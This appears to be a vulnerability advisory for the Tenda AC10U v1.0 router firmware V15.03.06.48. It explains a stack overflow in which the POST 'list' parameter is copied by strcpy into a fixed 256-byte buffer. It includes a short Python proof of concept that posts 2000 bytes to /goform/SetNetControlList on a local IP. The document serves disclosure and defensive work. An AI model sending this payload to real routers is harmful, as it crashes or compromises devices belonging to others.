## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `formSetQosBand` function. The `list` variable receives the `list` parameter from a POST request and this variable is passed into function `setQosMiblist` as `list`. In function `setQosMiblist`, variable `list` is passed to `p`, which is later assigned to the `qos_str` variable, which is fixed at 256 bytes. However, since the user can control the input of `list`, the statement `strcpy(qos_str, p);` can cause a buffer overflow. The user-provided  `list` can exceed the capacity of the `qos_str` array, triggering this security vulnerability.

![image-20240313151421962](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313151421962.png)

![image-20240313151613616](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313151613616.png)

![image-20240313151542937](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313151542937.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetNetControlList"
payload = b"a"*2000

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313183114940](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313183114940.png)
